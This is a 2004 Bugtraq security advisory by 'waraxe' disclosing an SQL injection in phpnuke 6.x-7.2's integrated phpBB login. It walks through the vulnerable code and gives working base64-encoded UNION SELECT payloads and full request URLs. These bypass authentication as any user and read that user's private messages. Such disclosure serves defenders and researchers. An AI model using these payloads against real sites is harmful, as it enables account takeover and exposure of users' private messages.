@@ -1,0 +1,169 @@
+
+Date: 12 Apr 2004 16:04:23 -0000
+From: Janek Vind <come2waraxe@...oo.com>
+To: bugtraq@...urityfocus.com
+Subject: [waraxe-2004-SA#017 - User-level authentication bypass in phpnuke
+    6.x-7.2]
+
+
+
+
+
+
+{================================================================================}
+{                              [waraxe-2004-SA#017]                              }
+{================================================================================}
+{                                                                                }
+{              [ User-level authentication bypass in phpnuke 6.x-7.2 ]           }
+{                                                                                }
+{================================================================================}
+                                                                                                                                
+Author: Janek Vind "waraxe"
+Date: 12. April 2004
+Location: Estonia, Tartu
+Web: http://www.waraxe.us/index.php?modname=sa&id=17
+
+
+Affected software description:
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Php-Nuke is popular freeware content management system, written in php by
+Francisco Burzi. This CMS (Content Management System) is used on many thousands
+websites, because it`s free of charge, easy to install and has broad set of features.
+
+Homepage: http://phpnuke.org
+
+
+
+Vulnerabilities:
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Let's begin our journey. I was exploring the phpnuke code and saw this code in
+modules.php in lines 20-21:
+
+global $nukeuser;
+    $nukeuser = base64_decode($user);
+
+Hmm, base64decoded global variable $nukeuser, it means, that $nukeuser can contain unslashed
+single quotes and potentially lead to sql injection...
+So, i was searching phpnuke source files to find out, for what is used this variable. And 
+the answer is - for integrated phpBB forum module in phpnuke.
+This is how it works - first forum module will call the function session_pagestart($user_ip, $thispage_id, $nukeuser)
+from sessions.php, this function will call  bblogin($nukeuser, $session_id) from functions.php .
+Now, here is some code fragments from bblogin():
+
+function bblogin($nukeuser, $session_id) {
+...
+$cookie = explode(":", $nukeuser);
+$nuid = $cookie[0];
+...
+if( $nuid != $logindata['session_user_id'] ) {
+   $nusername = $cookie[1];
+   $sql = "SELECT user_id, username, user_password, user_active, user_level
+           FROM ".USERS_TABLE."
+           WHERE username = '" . str_replace("\'", "''", $nusername) . "'";
+   $result = $db->sql_query($sql);
+   if(!$result) {
+                message_die(GENERAL_ERROR, "Error in obtaining userdata : login", "", __LINE__, __FILE__, $sql);
+   }
+...
+
+As we can see, base64decoded UNSLASHED data will be exploded to array $cookie and then username
+component will be used in sql query. Therefore sql injection must be possible...
+Now it's time to practical work. By the way, we don't need to play with cookies (this is little bit harder
+then GET requests), because phpnuke will globalize all the GPC variables, so there is no difference, it's
+COOKIE, POST or GET. Now, for proof testing let's contruct "cookie" like this:
+
+1:x'%20OR%20y/*:pwd
+
+and next let's base64encode them, so we get:  MTp4JyBPUiB5Lyo6cHdk
+Ok, now if we make HTTP request like this:
+ 
+http://localhost/nuke71/modules.php?name=Forums&user=MTp4JyBPUiB5Lyo6cHdk
+
+then most of the phpnuke installations will give us phpbb error message:
+
+------------------------------------------------------------------------
+General Error 
+
+Error in obtaining userdata : login
+
+DEBUG MODE
+
+SQL Error : 1054 Unknown column 'y' in 'where clause'
+
+SELECT user_id, username, user_password, user_active, user_level FROM nuke_users WHERE username = 'x' OR y/*'
+
+Line : 840
+File : D:\apache_wwwroot\nuke71\includes\functions.php	 
+------------------------------------------------------------------------
+
+And it's not surprise, that line 840 from functions.php belongs to function bblogin($nukeuser, $session_id)
+from integrated phpBB package. So we have proof of the real sql injection and can use this for
+full path disclosure and XSS. Hmm, maybe we can do something more "useful"? Answer is "yes", if the mysql
+engine has version number > 4.0 and UNION functionality is enabled. We can use UNION to "fake" any
+information, that phpnuke will try to query from database.
+In this stage WE NEED TO KNOW user_id of the user, who we are targeting. Admin's user-alias has
+probably user_id=2, but we can very easy get any user's user_aid, for example if we look at user's
+profile:
+
+http://localhost/nuke71/modules.php?name=Forums&file=profile&mode=viewprofile&u=2
+
+then we see "u=2", therefore user_id=2. Now let's contruct "cookie" like this:
+
+x:x'%20UNION%20SELECT%202,null,'pass',1,null/*:pass
+
+and base64encoded version is -->  eDp4JyBVTklPTiBTRUxFQ1QgMixudWxsLCdwYXNzJywxLG51bGwvKjpwYXNz
+So we make HTTP request like this:
+
+http://localhost/nuke71/modules.php?name=Forums&user=eDp4JyBVTklPTiBTRUxFQ1QgMixudWxsLCdwYXNzJywxLG51bGwvKjpwYXNz
+
+and we see forum page with link "log out [waraxe]" (with username, who's user_id=2). So, we just fooled
+phpnuke to believe, that we are authentic user, and that's without any authentication at all.
+Of course, work is not yet done - if we try to click on any links, then we see login page, because
+this sort of "authentication" is not permanent.
+There are many possibilities to improve this method and use it for different "bad things".
+I will show here example HTTP requests, that will make possible to read any user private messages
+without any authentication.
+If user "waraxe" has user_id=2, then lets construct "cookie" like this: 
+
+x:foo'%20UNION%20SELECT%202,null,1,1,null/*:1
+
+and after base64encode operation we get:  eDpmb28nIFVOSU9OIFNFTEVDVCAyLG51bGwsMSwxLG51bGwvKjox
+
+Next, we make HTTP request like this:
+
+http://localhost/nuke71/modules.php?name=Private_Messages&file=index&folder=inbox&user=eDpmb28nIFVOSU9OIFNFTEVDVCAyLG51bGwsMSwxLG51bGwvKjox
+
+and if you are lucky, you can see the pm list. Now, how we can read one of the private messages?
+Just copy the url of the private message, what you see in pm list, for example:
+
+http://localhost/nuke71/modules.php?name=Private_Messages&file=index&folder=inbox&mode=read&p=1
+
+and then add our "magic" string:
+
+http://localhost/nuke71/modules.php?name=Private_Messages&file=index&folder=inbox&mode=read&p=1&user=eDpmb28nIFVOSU9OIFNFTEVDVCAyLG51bGwsMSwxLG51bGwvKjox
+
+Paste this to url field in browser and make get request. Mission complete!
+
+
+
+Greetings:
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+    Greets to torufoorum members and to all bugtraq readers in Estonia! Tervitused!
+Special greets to Stefano from UT Bee Clan!
+
+
+
+Contact:
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+    come2waraxe@...oo.com
+    Janek Vind "waraxe"
+
+    Homepage: http://www.waraxe.us/
+
+---------------------------------- [ EOF ] ------------------------------------
+
+
